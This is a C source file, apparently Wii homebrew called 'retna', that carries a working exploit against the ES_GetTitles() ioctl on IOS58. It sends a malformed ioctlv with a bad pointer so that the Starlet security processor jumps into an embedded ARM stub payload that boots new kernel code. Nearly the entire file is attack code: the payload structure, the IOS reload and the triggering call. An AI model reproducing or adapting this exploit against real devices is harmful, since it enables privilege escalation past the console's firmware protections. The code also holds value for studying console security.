#include <stdio.h>
#include <ogc/pad.h>
#include <ogc/ipc.h>
#include <ogcsys.h>

#include "util.h"
#include "stub_bin.h"

// This is the malformed input to ES_GetTitles()
#define ALIGN(x)	__attribute__((aligned(x)))
#define BADPTR		(void*)0x201125b0
static u32 ALIGN(32)	empty = 0;
static ioctlv ALIGN(32)	payload[2] = {
	{ .data = &empty, .len = 4 }, 
	{ .data = BADPTR, .len = 0 }
};

int main(int argc, char **argv) 
{
	video_init();
	printf("retna\n");
	printf("[*] Press START to continue\n");
	while(1) 
	{
		PAD_ScanPads();
		u32 pressed = PAD_ButtonsDown(0);
		if ( pressed & PAD_BUTTON_START ) { break; }
		VIDEO_WaitVSync();
	}

	// This exploit using ES_GetTitles() has only been tested on IOS58.
	// If we can't load IOS58, just quit.

	int res = IOS_ReloadIOS(58);
	if (res) { 
		printf("[!] Couldn't reload IOS58, returned %d\n", res);
		printf("[!] This is only tested on IOS58.\n");
		retna_quit(-1);
	} else {
		printf("Successfully reloaded IOS58\n");
	}

	// When we execute ES_GetTitles() with this input, execution in the 
	// ES context (on Starlet) will branch to 0x00010000 in Thumb mode. 
	//
	// The .stub segment in this ELF (loaded at 0x80010000) contains the
	// ARM payload used to boot new kernel code.

	DCFlushRange((void*)&stub_bin, stub_bin_size);
	int esfd = IOS_Open("/dev/es", 0);
	res = IOS_Ioctlv(esfd, 0xf, 1, 1, payload);
	if (res != -1337) {
		printf("[!] ES_GetTitles() returned %d\n", res);
		printf("[!] Couldn't execute ARM stub loader ...?\n");
		retna_quit(-2);
	} else {
		printf("ARM stub loader executed sucessfully\n");
	}

	retna_quit(0);
}
